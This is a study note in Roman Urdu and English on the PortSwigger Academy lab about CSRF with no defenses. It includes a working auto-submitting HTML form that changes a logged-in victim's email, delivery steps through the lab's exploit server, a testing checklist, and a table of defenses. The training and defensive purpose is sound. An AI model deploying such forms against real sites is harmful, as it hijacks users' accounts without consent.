# ğŸ›¡ï¸ CSRF Vulnerability with No Defenses â€“ Urdu Style Note

## ğŸ”¬ Lab ka Naam:

> **CSRF vulnerability with no defenses** â€“ PortSwigger Academy

---

## ğŸ§  Hum ne kya seekha?

* Jab kisi web app mein **sirf login** hota hai lekin **CSRF token ka use nahi** hota, to attacker **user ke browser se action karwa sakta hai** bina uski marzi ke.
* Browser to cookies bhejta hai hi â€” galti hoti hai **server ki**, jo blindly request accept kar leta hai.

---

## âš™ï¸ Lab Solve Karne ka A to Z Tareeqa

### âœ… Step 1: Login karo

* Open Burp's browser
* Login with:

  ```
  Username: wiener  
  Password: peter
  ```

---

### âœ… Step 2: Email Change Request pakro

* â€œMy accountâ€ page pe jao
* Email address change karo (e.g., [test@csrf.com](mailto:test@csrf.com))
* Burp > HTTP History mein request dhoondo:

  ```
  POST /my-account/change-email
  ```

---

### âœ… Step 3: Action URL copy karo

* Us request pe right-click karo â†’ **Copy URL**
* Example:

  ```
  https://LAB-ID.web-security-academy.net/my-account/change-email
  ```

---

### âœ… Step 4: Exploit HTML banao

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@csrf123.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

ğŸ“Œ Notes:

* `action` mein apna lab URL lagao
* Email `wiener@...` na ho, koi naya ho

---

### âœ… Step 5: Exploit server pe paste karo

* Lab page pe â€œGo to exploit serverâ€ pe click karo
* Upar wala HTML **Body** mein paste karo
* Click: **Store exploit**

---

### âœ… Step 6: Deliver to Victim

* Ab **â€œDeliver to victimâ€** button dabao
* Agar sab sahi hua ho to:

  ```
  âœ… Congratulations, you solved the lab!
  ```

---

## ğŸ” Yeh kis type ka attack tha?

| Attack Type          | Details                                           |
| -------------------- | ------------------------------------------------- |
| CSRF                 | Cross-Site Request Forgery                        |
| Kya hota hai?        | Victim ke browser se unwanted request bhejna      |
| Target kya hota hai? | State-changing actions like email/password change |

---

## ğŸ” Client vs Server Side ka Role

| Side                 | Role                                          | Galti kiski? |
| -------------------- | --------------------------------------------- | ------------ |
| **Client (Browser)** | Request bhejta hai with cookies               | âŒ Nahi       |
| **Server (App)**     | Validate karna chahiye tha (CSRF token check) | âœ… Haan       |

---

## ğŸ” Pentester ban'ne ke liye yeh kaise dhoondhna hai?

1. Login karo as normal user
2. Identify karo state-changing feature (email change, etc.)
3. Uski request capture karo Burp mein
4. Dekho:

   * CSRF token hai?
   * Cookie based hai?
5. Token hata ke request resend karo
6. Agar still success â†’ vulnerable!
7. Exploit HTML banao aur confirm karo

---

## ğŸ¤” Real World Example

* Tumne `exploit.com/csrf.html` banaya
* Victim login hai `target.com` pe
* Agar target.com mein CSRF defense nahi hai, to victim ka email change ho jayega

---

## â“ Agar site secure ho (jaise beingguru.com)?

* Agar woh:

  * CSRF token use karta hai
  * SameSite cookies laga rakhi hain
  * Origin header check karta hai
    â†’ To attacker kuch bhi nahi kar sakta.

---

## ğŸ§  Final Tip for Bug Bounty & Pentest

| Protection           | Explanation                                   |
| -------------------- | --------------------------------------------- |
| CSRF Token           | Every form should have unique token           |
| SameSite Cookies     | Prevents cross-site cookie sending            |
| Origin/Referer Check | Server should verify origin of request        |
| Re-authentication    | Critical action pe dobara password manga jaye |

---
